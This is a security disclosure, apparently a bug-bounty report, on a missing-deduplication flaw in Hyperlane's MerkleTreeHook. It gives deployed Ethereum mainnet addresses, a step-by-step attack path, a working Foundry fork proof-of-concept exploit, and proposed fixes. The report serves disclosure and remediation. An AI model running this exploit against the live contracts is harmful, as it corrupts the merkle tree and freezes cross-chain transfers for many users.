## Missing deduplication in MerkleTreeHook.postDispatch() allows anyone to corrupt merkle tree, freezing cross-chain message delivery

---

## Summary

`AbstractPostDispatchHook.postDispatch()` is `external payable` with **no access control**. The only guard inside `MerkleTreeHook._postDispatch()` is `_isLatestDispatched(id)`, which reads `Mailbox.latestDispatchedId()` — a value that **persists** after `dispatch()` returns. Anyone can call `MerkleTreeHook.postDispatch()` after a legitimate dispatch to insert the same message into the merkle tree a second time, breaking the invariant `tree.count == mailbox.nonce` and corrupting merkle proofs for all subsequent messages.

---

## Vulnerability Details

**Contract:** `MerkleTreeHook.sol` (via `AbstractPostDispatchHook.sol`)
**Function:** `postDispatch()` line 74-83 in AbstractPostDispatchHook, `_postDispatch()` line 63-77 in MerkleTreeHook
**Type:** Missing access control / Missing deduplication
**Deployed:** `0x48e6c30B97748d1e2e03bf3e9FbE3890ca5f8CCA` (Ethereum mainnet)

**Vulnerable Code (AbstractPostDispatchHook.sol:74-83):**
```solidity
/// @inheritdoc IPostDispatchHook
function postDispatch(
    bytes calldata metadata,
    bytes calldata message
) external payable override {       // ← NO ACCESS CONTROL
    require(
        supportsMetadata(metadata),
        "AbstractPostDispatchHook: invalid metadata variant"
    );
    _postDispatch(metadata, message);
}
```

**Vulnerable Code (MerkleTreeHook.sol:63-77):**
```solidity
function _postDispatch(
    bytes calldata,
    bytes calldata message
) internal override {
    require(msg.value == 0, "MerkleTreeHook: no value expected");

    bytes32 id = message.id();
    require(_isLatestDispatched(id), "message not dispatching");  // ← STATELESS CHECK

    uint32 index = count();
    _tree.insert(id);              // ← DUPLICATE INSERT
    emit InsertedIntoTree(id, index);
}
```

**Comparison Evidence:**
`RateLimitedHook._postDispatch()` (line 82) uses `validateMessageOnce(_message)` modifier with a `mapping(bytes32 => bool) messageDelivered` to prevent double-calls. **MerkleTreeHook has no such deduplication.**

```solidity
// RateLimitedHook.sol:45-53 — CORRECTLY prevents double-call
modifier validateMessageOnce(bytes calldata _message) {
    bytes32 messageId = _message.id();
    require(!messageDelivered[messageId], "MessageAlreadyDelivered");
    messageDelivered[messageId] = true;
    _;
}
```

**Root Cause:**
`_isLatestDispatched(id)` reads `mailbox.latestDispatchedId()` which is a **non-clearing** state variable. After `Mailbox.dispatch()` returns, `latestDispatchedId` still holds the dispatched message's ID indefinitely (until the next dispatch). Since `postDispatch()` is `external` with no caller restriction, anyone can re-invoke it with the same message, and the `_isLatestDispatched` check passes because the ID hasn't changed.

**Attack Path:**
1. Monitor mempool for `Mailbox.dispatch()` transactions
2. After dispatch TX confirms, note the nonce and message parameters
3. Reconstruct the message: `abi.encodePacked(version, nonce, localDomain, sender, destination, recipient, body)`
4. Call `MerkleTreeHook.postDispatch(bytes(""), reconstructed_message)`
5. `_isLatestDispatched` passes (latestDispatchedId unchanged)
6. Same message ID inserted into tree again at index `count`
7. Now `tree.count = nonce + 1` (invariant broken)
8. Repeat N times to insert N phantom entries
9. All subsequent messages have wrong tree indices
10. Validators sign checkpoints with corrupted root → relayers cannot construct valid merkle proofs → cross-chain delivery fails

**Affected Hooks (same root cause):**

| Hook | Impact | Additional Guards |
|------|--------|-------------------|
| **MerkleTreeHook** | Merkle tree corruption → delivery failure | None |
| **AbstractMessageIdAuthHook** (OPStackHook, ArbL2ToL1Hook, CCIPHook, ERC5164Hook) | Double bridge message to ISM | destination domain check only |
| **TokenBridgeCctpBase** | Double CCTP circle message | None beyond _isLatestDispatched |
| **TimelockRouter** | Double preverification dispatch | None |
| **RateLimitedHook** | **NOT affected** — has `validateMessageOnce` | ✅ Deduplication mapping |

---

## Impact

**Severity:** High
**Category:** Temporary freezing of funds (cross-chain warp route transfers)

**Quantified Impact:**
- Hyperlane secures cross-chain messaging across 50+ chains
- Warp routes (token bridges) depend on MerkleTreeHook for message verification
- One double-insert corrupts the tree permanently for that chain's Mailbox
- All cross-chain transfers via warp routes on the affected chain are frozen until detection and mitigation
- Attack cost: ~0.01 ETH gas per double-insert (no capital required)
- Attack is repeatable — can insert unlimited phantom entries

**Preconditions:**
- MerkleTreeHook is set as `requiredHook` on the Mailbox (true on Ethereum mainnet)
- At least one `dispatch()` has been called (always true on live chains)

---

## Proof of Concept

Fork PoC confirmed on Ethereum mainnet. Run with:
```bash
ETH_RPC_URL="https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY" \
forge test --match-test test_MDD01_doubleInsert --fork-url $ETH_RPC_URL -vvv
```

```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {IMailbox} from "../../contracts/interfaces/IMailbox.sol";
import {MerkleTreeHook} from "../../contracts/hooks/MerkleTreeHook.sol";
import {TypeCasts} from "../../contracts/libs/TypeCasts.sol";

contract ForkPoC_MDD01 is Test {
    IMailbox constant MAILBOX = IMailbox(0xc005dc82818d67AF737725bD4bf75435d065D239);
    MerkleTreeHook constant MERKLE_HOOK = MerkleTreeHook(0x48e6c30B97748d1e2e03bf3e9FbE3890ca5f8CCA);
    uint32 constant DEST_DOMAIN = 8453; // Base

    function test_MDD01_doubleInsert() public {
        uint32 nonceBefore = MAILBOX.nonce();
        uint32 treeCountBefore = MERKLE_HOOK.count();
        console.log("Before: nonce=%d, treeCount=%d", nonceBefore, treeCountBefore);

        // Step 1: Legitimate dispatch
        bytes32 recipient = bytes32(uint256(uint160(address(0xdead))));
        bytes memory body = bytes("M-DD-01 PoC");
        uint256 fee = MAILBOX.quoteDispatch(DEST_DOMAIN, recipient, body);
        vm.deal(address(this), fee + 1 ether);
        MAILBOX.dispatch{value: fee}(DEST_DOMAIN, recipient, body);

        uint32 treeCountAfterDispatch = MERKLE_HOOK.count();
        console.log("After dispatch: nonce=%d, treeCount=%d", MAILBOX.nonce(), treeCountAfterDispatch);

        // Step 2: ATTACK — anyone calls postDispatch directly
        bytes memory message = abi.encodePacked(
            uint8(3),                   // VERSION
            nonceBefore,                // nonce of the dispatched message
            MAILBOX.localDomain(),
            TypeCasts.addressToBytes32(address(this)),
            DEST_DOMAIN,
            recipient,
            body
        );

        // postDispatch is external payable with NO access control
        (bool success,) = address(MERKLE_HOOK).call(
            abi.encodeWithSignature("postDispatch(bytes,bytes)", bytes(""), message)
        );

        uint32 treeCountAfterAttack = MERKLE_HOOK.count();
        uint32 nonceAfterAttack = MAILBOX.nonce();
        console.log("After attack: nonce=%d, treeCount=%d", nonceAfterAttack, treeCountAfterAttack);

        // Verify the attack
        assertTrue(success, "postDispatch call should succeed");
        assertGt(treeCountAfterAttack, treeCountAfterDispatch,
            "M-DD-01: tree grew without dispatch -- double-insert confirmed");
        assertEq(nonceAfterAttack, nonceBefore + 1,
            "nonce should only increment once (from dispatch)");

        console.log("!!! M-DD-01 CONFIRMED: %d extra tree entries without dispatch !!!",
            treeCountAfterAttack - treeCountAfterDispatch);
    }

    receive() external payable {}
}
```

**Expected Output:**
```
[PASS] test_MDD01_doubleInsert()
Logs:
  Before: nonce=182165, treeCount=180640
  After dispatch: nonce=182166, treeCount=180641
  After attack: nonce=182166, treeCount=180642
  !!! M-DD-01 CONFIRMED: 1 extra tree entries without dispatch !!!
```

---

## Recommended Fix

Add a deduplication mapping to `MerkleTreeHook`, following the `RateLimitedHook` pattern:

```solidity
// MerkleTreeHook.sol — add deduplication
mapping(bytes32 => bool) public inserted;

function _postDispatch(
    bytes calldata,
    bytes calldata message
) internal override {
    require(msg.value == 0, "MerkleTreeHook: no value expected");

    bytes32 id = message.id();
    require(_isLatestDispatched(id), "message not dispatching");
+   require(!inserted[id], "message already inserted");
+   inserted[id] = true;

    uint32 index = count();
    _tree.insert(id);
    emit InsertedIntoTree(id, index);
}
```

Alternatively, restrict `postDispatch()` in `AbstractPostDispatchHook` to only be callable by the Mailbox:
```solidity
function postDispatch(
    bytes calldata metadata,
    bytes calldata message
) external payable override {
+   require(msg.sender == address(mailbox), "only mailbox");
    require(supportsMetadata(metadata), "invalid metadata variant");
    _postDispatch(metadata, message);
}
```

---

## References

- Vulnerable code: `MerkleTreeHook.sol` line 72 (deployed at `0x48e6c30B97748d1e2e03bf3e9FbE3890ca5f8CCA`)
- Parent class: `AbstractPostDispatchHook.sol` line 74-83 (external postDispatch with no access control)
- Comparison: `RateLimitedHook.sol` line 45-53 (has `validateMessageOnce` deduplication)
- CWE-284: Improper Access Control
- CWE-837: Improper Enforcement of a Single, Unique Action
